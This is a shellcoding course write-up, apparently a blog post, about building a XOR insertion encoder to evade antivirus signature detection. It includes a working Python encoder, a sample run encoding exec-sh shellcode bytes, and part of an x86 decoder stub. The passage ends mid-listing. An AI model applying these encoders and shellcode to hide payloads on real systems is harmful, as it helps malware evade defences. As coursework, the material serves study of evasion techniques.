<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/vollkorn/Vollkorn-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection"><meta name=twitter:title content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection"><meta itemprop=name content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection"><meta name=application-name content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content=2020-01-24T13:33:37Z><meta property="article:published_time" content=2020-01-24T13:33:37Z><base href=https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/><link rel=canonical href=https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/ itemprop=url><meta name=url content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/"><meta name=twitter:url content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/"><meta property="og:url" content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Bypass signature detection with a custom encoder"><meta itemprop=description content="Bypass signature detection with a custom encoder"><meta property="og:description" content="Bypass signature detection with a custom encoder"><meta name=twitter:description content="Bypass signature detection with a custom encoder"><meta itemprop=image content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/hacker2.jpg"><meta property="og:image" content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/hacker2.jpg"><meta name=twitter:image content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/hacker2.jpg"><meta name=twitter:image:src content="https://dubell.io/slae-4-custom-encoder-for-bypassing-signature-based-detection/hacker2.jpg"><meta property="og:updated_time" content=2020-01-24T13:33:37Z><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io/sitemap.xml><title>dubell.io | SLAE 4: Custom encoder for bypassing signature based detection</title></head><body><div class=container><div class=row><div class=col><h1 class=logo-title><a href=/>dubell.io</a></h1></div></div><div class=row><div class=col><nav id=menu><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/categories/advisories/>/home/advisories</a></li><li><a href="https://github.com/dubs3c?tab=repositories&q=&type=source&language=&sort=">/home/code</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></nav></div></div><div class=row><article><h1>SLAE 4: Custom encoder for bypassing signature based detection</h1><p><small><a href=/categories/programming>Programming</a> / January 24, 2020 â€¢ 5 min read</small><br><small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></small></p><div id=article_content><div class=row><div class=col-lg-6><p>Malware detection techniques has improved a lot over the years. Today companies are investing in machine learning methods for detecting malware, which sounds pretty cool if you ask me. However, there is one method that has been used since the first anti-virus software, which is signature based detection.</p><p>When disassembling a program you can analyze the assembly instructions in order to understand the program from the lowest level. It&rsquo;s also possible from the assembly code to identify a set of unique instructions that identifies a specific program. These unique instructions form the signature. The instructions can be anything that identifies a specific and unique behaviour in the program. An example could be a decryption routine that identifies a decryption stub used for decrypting shellcode.</p><p>How do we bypass signature detections? Well, we change the signature. You either do this manually or you write an encoder which takes shellcode as input and outputs an encoded shellcode, which as zero known signatures for it. In this article, I will present a very easy and trivial encoding scheme for hiding from AVs :)</p><h2 id=the-algorithm>The Algorithm</h2><p>The scheme I have chosen is a simple insertion encoder with XOR twist. Given a piece of shellcode, the encoder will generate a random value K<sub>n</sub> between 1-255 for each shellcode byte S<sub>n</sub>. Each random value will be XORed with with each shellcode byte, like so: K<sub>1</sub> ^ S<sub>1</sub> = R<sub>1</sub>. The original shellcode will be modified to include the random value as a prefix for the now encoded shellcode byte. The final shellcode can be seen as:</p><pre tabindex=0><code>[K1][R1][K2][R2][K3][R3]...[KN][RN]
</code></pre><p>Even though it is a trivial obfuscation technique, it has some drawbacks:</p><ul><li>It will double the shellcode length</li><li>Once the shellcode has been decoded, a bunch of garbage data will exist following the shellcode. This means that if your shellcode does not return, the garbage data will be executed which leads to a segfault.</li></ul><p>However, for demonstrating how bypassing signature detection can look like, this method will suffice.</p><h2 id=the-encoder>The Encoder</h2><p>I have chosen to write the encoder in Python because it&rsquo;s very easy to implement these kinds of scripts with it.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#a90d91>import</span> <span style=color:#000>sys</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#a90d91>import</span> <span style=color:#000>random</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#a90d91>def</span> <span style=color:#000>encode</span>(<span style=color:#000>shellcode</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#c41a16>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#c41a16>    shellcode: string
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#c41a16>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#c41a16>    returns: string
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#c41a16>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#000>shellcode_output</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#000>shellcode_list</span> <span style=color:#000>=</span> []
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#a90d91>for</span> <span style=color:#000>i</span> <span style=color:#000>in</span> <span style=color:#000>shellcode</span><span style=color:#000>.</span><span style=color:#000>split</span>(<span style=color:#c41a16>&#34;</span><span style=color:#c41a16>\\</span><span style=color:#c41a16>&#34;</span>)[<span style=color:#1c01ce>1</span>:]:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#000>xor_key</span> <span style=color:#000>=</span> <span style=color:#000>random</span><span style=color:#000>.</span><span style=color:#000>randint</span>(<span style=color:#1c01ce>1</span>,<span style=color:#1c01ce>254</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#000>hex_key</span> <span style=color:#000>=</span> <span style=color:#a90d91>hex</span>(<span style=color:#000>xor_key</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#000>byte</span> <span style=color:#000>=</span> <span style=color:#a90d91>int</span>(<span style=color:#000>i</span><span style=color:#000>.</span><span style=color:#000>replace</span>(<span style=color:#c41a16>&#34;x&#34;</span>, <span style=color:#c41a16>&#34;0x&#34;</span>), <span style=color:#1c01ce>16</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        <span style=color:#000>shellcode_list</span><span style=color:#000>.</span><span style=color:#000>append</span>(<span style=color:#000>hex_key</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        <span style=color:#000>shellcode_list</span><span style=color:#000>.</span><span style=color:#000>append</span>(<span style=color:#a90d91>hex</span>(<span style=color:#000>xor_key</span> <span style=color:#000>^</span> <span style=color:#000>byte</span>))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#a90d91>return</span> <span style=color:#c41a16>&#34;,&#34;</span><span style=color:#000>.</span><span style=color:#000>join</span>(<span style=color:#000>shellcode_list</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#a90d91>def</span> <span style=color:#000>decode</span>(<span style=color:#000>encoded_shellcode</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    <span style=color:#c41a16>&#34;&#34;&#34;decode()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#c41a16>    encoded_shellcode: string
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#c41a16>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#c41a16>    returns: string
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#c41a16>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>    <span style=color:#000>shellcode_list</span> <span style=color:#000>=</span> <span style=color:#000>encoded_shellcode</span><span style=color:#000>.</span><span style=color:#000>split</span>(<span style=color:#c41a16>&#34;,&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    <span style=color:#000>it</span> <span style=color:#000>=</span> <span style=color:#a90d91>iter</span>(<span style=color:#000>shellcode_list</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#000>decoded_shellcode</span> <span style=color:#000>=</span> []
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#a90d91>for</span> <span style=color:#000>x</span> <span style=color:#000>in</span> <span style=color:#000>it</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        <span style=color:#000>decoded_shellcode</span><span style=color:#000>.</span><span style=color:#000>append</span>(<span style=color:#a90d91>hex</span>(<span style=color:#a90d91>int</span>(<span style=color:#000>x</span>, <span style=color:#1c01ce>16</span>) <span style=color:#000>^</span> <span style=color:#a90d91>int</span>(<span style=color:#a90d91>next</span>(<span style=color:#000>it</span>), <span style=color:#1c01ce>16</span>)))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    <span style=color:#a90d91>return</span> <span style=color:#c41a16>&#34;,&#34;</span><span style=color:#000>.</span><span style=color:#000>join</span>(<span style=color:#000>decoded_shellcode</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#a90d91>def</span> <span style=color:#000>main</span>(<span style=color:#000>shellcode</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>    <span style=color:#c41a16>&#34;&#34;&#34;main()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#c41a16>    shellcode: string
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span><span style=color:#c41a16>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>    <span style=color:#000>orginal_shellcode</span> <span style=color:#000>=</span> <span style=color:#c41a16>r</span><span style=color:#c41a16>&#34;</span><span style=color:#c41a16>{}</span><span style=color:#c41a16>&#34;</span><span style=color:#000>.</span><span style=color:#000>format</span>(<span style=color:#000>shellcode</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>    <span style=color:#000>new_shellcode</span> <span style=color:#000>=</span> <span style=color:#000>encode</span>(<span style=color:#000>orginal_shellcode</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>    <span style=color:#a90d91>print</span>(<span style=color:#c41a16>&#34;[+] Your encoded shellcode: &#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    <span style=color:#a90d91>print</span>(<span style=color:#000>new_shellcode</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>    <span style=color:#a90d91>print</span>(<span style=color:#c41a16>&#34;</span><span style=color:#c41a16>\n</span><span style=color:#c41a16>[+] Decoded shellcode:&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>    <span style=color:#000>decoded_shellcode</span> <span style=color:#000>=</span> <span style=color:#000>decode</span>(<span style=color:#000>new_shellcode</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>    <span style=color:#a90d91>print</span>(<span style=color:#000>decoded_shellcode</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>    <span style=color:#a90d91>assert</span> <span style=color:#000>decoded_shellcode</span><span style=color:#000>.</span><span style=color:#000>replace</span>(<span style=color:#c41a16>&#34;0x&#34;</span>,<span style=color:#c41a16>&#34;</span><span style=color:#c41a16>\\</span><span style=color:#c41a16>x&#34;</span>)<span style=color:#000>.</span><span style=color:#000>replace</span>(<span style=color:#c41a16>&#34;,&#34;</span>,<span style=color:#c41a16>&#34;&#34;</span>) <span style=color:#000>==</span> <span style=color:#000>orginal_shellcode</span><span style=color:#000>.</span><span style=color:#000>replace</span>(<span style=color:#c41a16>&#34;</span><span style=color:#c41a16>\\</span><span style=color:#c41a16>x0&#34;</span>, <span style=color:#c41a16>&#34;</span><span style=color:#c41a16>\\</span><span style=color:#c41a16>x&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span><span style=color:#a90d91>if</span> <span style=color:#000>__name__</span> <span style=color:#000>==</span> <span style=color:#c41a16>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>    <span style=color:#a90d91>if</span> <span style=color:#a90d91>len</span>(<span style=color:#000>sys</span><span style=color:#000>.</span><span style=color:#000>argv</span>) <span style=color:#000>&lt;</span> <span style=color:#1c01ce>2</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>        <span style=color:#a90d91>print</span>(<span style=color:#c41a16>&#34;Usage: python3 wrapper.py &lt;shellcode&gt;&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>        <span style=color:#000>sys</span><span style=color:#000>.</span><span style=color:#000>exit</span>(<span style=color:#1c01ce>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>    <span style=color:#a90d91>if</span> <span style=color:#a90d91>len</span>(<span style=color:#000>sys</span><span style=color:#000>.</span><span style=color:#000>argv</span>) <span style=color:#000>==</span> <span style=color:#1c01ce>2</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>        <span style=color:#000>main</span>(<span style=color:#000>sys</span><span style=color:#000>.</span><span style=color:#000>argv</span>[<span style=color:#1c01ce>1</span>])
</span></span></code></pre></div><p>To use the program, simply input your shellcode and receive the encoded version:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ python3 wrapper.py &#34;\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde&#34;
[+] Your encoded shellcode:
0x77,0x8b,0x4a,0xf1,0xdb,0xc0,0x5,0x94,0xe7,0x2a,0x43,0x8b,0x93,0x78,0x73,0x7f,0x38,0x66,0xe5,0xb3,0x14,0x25,0x2d,0x33,0x6b,0xc6,0xc5,0xc4,0x56,0x95,0x8d,0x8,0x2f,0xef,0xd,0x78,0x9f,0x68,0x7a,0xb9,0xd7,0x3f,0xf5,0x1a,0xba,0x45,0x2,0xfd,0x93,0x6c,0xe3,0xc9,0xee,0xad,0x93,0xc,0xb5,0x15,0xe3,0xc1,0xe,0x42,0xbd,0xee,0xf8,0xa1,0xaf,0x7d,0x65,0xd8,0x24,0x98,0x86,0x7d,0xb1,0xfa,0xf8,0xb3,0x96,0xb7,0x2a,0xe0,0x27,0x65,0x69,0x13,0x3a,0x5c,0x55,0xc8,0x1,0x5e,0x59,0xe9,0x7a,0x9c,0xd7,0x9,0xb2,0xed,0xc5,0x8f,0xd4,0x33,0xfa,0x24

[+] Decoded shellcode:
0xfc,0xbb,0x1b,0x91,0xcd,0xc8,0xeb,0xc,0x5e,0x56,0x31,0x1e,0xad,0x1,0xc3,0x85,0xc0,0x75,0xf7,0xc3,0xe8,0xef,0xff,0xff,0xff,0x2a,0x43,0x9f,0xa0,0x22,0x4c,0x53,0x59,0xd2,0xbd,0xbc,0xfb,0x4b,0x4b,0x21,0xca,0x42,0x7a,0x66,0x9d,0x5f,0xb0,0xe6,0xde,0x5f,0x4a,0xe7,0xde
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$
</code></pre><p>The shellcode used in the example above is a simple <code>exec-sh</code> shellcode which will drop into an <code>sh</code> shell.</p><h2 id=writing-the-decoder-stub>Writing the decoder stub</h2><p>It&rsquo;s time to write the decoder stub. The following is a simple program for looping through the shellcode, XORing bytes and reconstructing the original shellcode.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#177500>;-------------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#177500>;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#177500>; Author: dubs3c
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#177500>;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#177500>; Purpose:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#177500>; Insertion Encoder, hide from AV :)
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#177500>;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#177500>;-------------------------------------
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#177500></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#000>global</span> <span style=color:#000>_start</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#000>section</span> <span style=color:#000>.text</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#000>_start:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#000>jmp</span> <span style=color:#000>short</span> <span style=color:#000>call_shellcode</span>        <span style=color:#177500>; jmp-call-pop method
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#177500></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#000>decoder:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#000>pop</span> <span style=color:#000>esi</span>                         <span style=color:#177500>; Get the address of EncodedShellcode
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#177500></span>    <span style=color:#000>lea</span> <span style=color:#000>edi</span>, [<span style=color:#000>esi</span> <span style=color:#000>+</span> <span style=color:#1c01ce>1</span>]              <span style=color:#177500>; edi points to the next byte
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#177500></span>    <span style=color:#000>xor</span> <span style=color:#000>eax</span>, <span style=color:#000>eax</span>                    <span style=color:#177500>; zero out register
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#177500></span>    <span style=color:#000>xor</span> <span style=color:#000>ebx</span>, <span style=color:#000>ebx</span>                    <span style=color:#177500>; zero out register
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#177500></span>    <span style=color:#000>xor</span> <span style=color:#000>edx</span>, <span style=color:#000>edx</span>                    <span style=color:#177500>; zero out register
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#177500></span>    <span style=color:#000>xor</span> <span style=color:#000>ecx</span>, <span style=color:#000>ecx</span>                    <span style=color:#177500>; zero out register
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#177500></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#000>decode:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>    <span style=color:#000>mov</span> <span style=color:#000>bl</span>, <span style=color:#000>byte</span> [<span style=color:#000>esi</span> <span style=color:#000>+</span> <span style=color:#000>eax</span>]        <span style=color:#177500>; Get the byte at esi + eax
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#177500></span>    <span style=color:#000>xor</span> <span style=color:#000>bl</span>, <span style=color:#1c01ce>0xaa</span>                    <span style=color:#177500>; XOR with 0xaa to check if we are at the end of the shellcode
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#177500></span>    <span style=color:#000>jz</span> <span style=color:#000>short</span> <span style=color:#000>EncodedShellcode</span>       <span style=color:#177500>; If we are at the end, we are done, jump to shellcode
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#177500></span>    <span style=color:#000>mov</span> <span style=color:#000>dl</span>, <span style=color:#000>byte</span> [<span style=color:#000>esi</span> <span style=color:#000>+</span> <span style=color:#000>eax</span>]        <span style=color:#177500>; Get the byte at esi + eax
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#177500></span>    <span style=color:#000>mov</span> <span style=color:#000>bl</span>, <span style=color:#000>byte</span> [<span style=color:#000>esi</span> <span style=color:#000>+</span> <span style=color:#000>eax</span> <span style=color:#000>+</span> <span style=color:#1c01ce>1</span>]    <span style=color:#177500>; Get the byte at esi + eax + 1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#177500></span>    <span style=color:#000>xor</span> <span style=color:#000>dl</span>, <span style=color:#000>bl</span>                      <span style=color:#177500>; XOR to get orignal shellcode byte
